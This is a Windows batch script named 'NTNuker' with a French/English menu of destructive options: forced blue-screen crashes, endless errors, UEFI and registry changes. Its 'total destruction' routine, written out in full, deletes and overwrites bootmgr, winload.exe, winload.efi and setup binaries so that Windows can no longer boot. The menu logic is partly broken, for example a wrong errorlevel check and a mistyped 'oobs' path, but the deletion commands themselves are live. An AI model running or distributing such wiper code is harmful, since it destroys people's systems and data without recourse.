@echo off
@color 0a
@title NTNuker

echo Welcome/Bienvenue
echo Choose your language/Choisissez votre langue
echo.
echo [F] Francais/French
echo [E] English/Anglais
choice /c:FE 
if %errorlevel% == 0 (
cls
goto :menu_fr
)
if %errorlevel% == 2 (
cls
goto :menu_en
)

:: Français/French
:menu_fr
echo [X] Destruction totale
echo.
echo [A] Crash BSoD (CRITICAL_PROCESS_DIED)
echo [B] Crash Win32
echo [C] Erreur infinie (Requiert Windows 7 ou plus)
echo [D] Modifier UEFI (Requiert firmware compatible UEFI)
echo [E] Modifier registre
choice /c:ABCDEFGHIJKLMNOPQRSTUVW /n

:fulldestroy_fr
cls
color 0c
echo Etes vous sur de continuer ? Celle-ci rendera l'ordinateur inutilisable
pause
cls
echo Dernier avertissement : Si vous continuer, Windows sera inutilisable
pause
cls
timeout /t 2 /nobreak>nul
set sd=%systemdrive%
set sw=%WinDir%\System32
::
del %sd%\bootmgr /s /f /q
echo Nuked > %sd%\bootmgr 
echo Corrompu: Boot Manager
::
del %sw%\winload.exe /s /f /q
echo Nuked > %sw%\winload.exe
echo Corrompu: Windows Loader
::
del %sw%\winload.efi /s /f /q
echo Nuked > %sw%\winload.efi
echo Corrompu: Windows Loader (EFI)
::
del %sw%\oobe\msoobe.exe /s /f /q
echo Nuked > %sw%\oobe\msoobe.exe
echo Corrompu: Out Of Box Experience Setup
::
del %sw%\oobs\windeploy.exe /s /f /q
echo Nuked > %sw%\oobe\windeploy.exe
echo Corrompu: Windows Drivers Deployer
